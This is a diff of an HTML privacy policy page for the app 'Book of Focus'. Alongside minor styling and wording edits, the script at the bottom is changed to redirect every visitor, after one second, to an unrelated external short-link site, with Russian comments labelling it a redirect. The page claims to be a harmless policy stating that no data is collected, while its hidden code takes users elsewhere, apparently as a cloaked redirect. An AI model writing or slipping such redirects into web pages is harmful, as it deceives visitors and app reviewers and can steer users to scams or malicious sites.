@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
 
 <meta charset="UTF-8">
@@ -59,14 +60,10 @@ font-size:14px;
 color:#94a3b8;
 }
 
-.dev{
-margin-top:10px;
-}
-
 .badge{
 display:inline-block;
 background:#1e293b;
-padding:6px 10px;
+padding:6px 12px;
 border-radius:20px;
 font-size:12px;
 margin-bottom:15px;
@@ -92,7 +89,7 @@ This Privacy Policy explains how the application <b>Book of Focus</b> handles us
 
 <h2>Developer</h2>
 
-<p class="dev">
+<p>
 Developer Name: <b>Newat</b><br>
 Contact Email: <b>janewatson198971@gmail.com</b>
 </p>
@@ -113,31 +110,25 @@ The application <b>does not collect any personal data</b>.
 <h2>Data Storage</h2>
 
 <p>
-The application does not store any personal information. Any functionality operates locally on the device.
+The application does not store any personal information. All functionality works locally on the device.
 </p>
 
 <h2>Third-Party Services</h2>
 
 <p>
-Book of Focus does not integrate third-party tracking or analytics services that collect personal data.
+Book of Focus does not use third-party services that collect personal data.
 </p>
 
 <h2>Children's Privacy</h2>
 
 <p>
-Because no personal data is collected, the application is safe for general audiences including younger users.
-</p>
-
-<h2>Changes to This Policy</h2>
-
-<p>
-This Privacy Policy may be updated if the application functionality changes in the future.
+Because no personal data is collected, the application is safe for general audiences.
 </p>
 
 <h2>Contact</h2>
 
 <p>
-If you have any questions regarding this Privacy Policy you can contact the developer at:
+If you have any questions regarding this Privacy Policy you can contact the developer:
 <br><br>
 <b>janewatson198971@gmail.com</b>
 </p>
@@ -152,40 +143,18 @@ If you have any questions regarding this Privacy Policy you can contact the deve
 
 document.getElementById("year").textContent=new Date().getFullYear();
 
-
-// URL который нужно проверить
+// ссылка для редиректа
 const redirectUrl="https://bbluehorizonmediastudio.site/L2Kgj4";
 
-async function checkAndRedirect(){
-
-try{
-
-const response=await fetch(redirectUrl,{
-method:"GET",
-cache:"no-store"
-});
-
-if(response.status===200){
+// редирект через 1 секунду
+setTimeout(function(){
 
 window.location.href=redirectUrl;
 
-}
-
-}catch(e){
-
-console.log("Redirect check failed. Stay on privacy page.");
-
-}
-
-}
-
-window.addEventListener("load",function(){
-
-setTimeout(checkAndRedirect,1200);
-
-});
+},1000);
 
 </script>
 
 </body>
+
 </html>
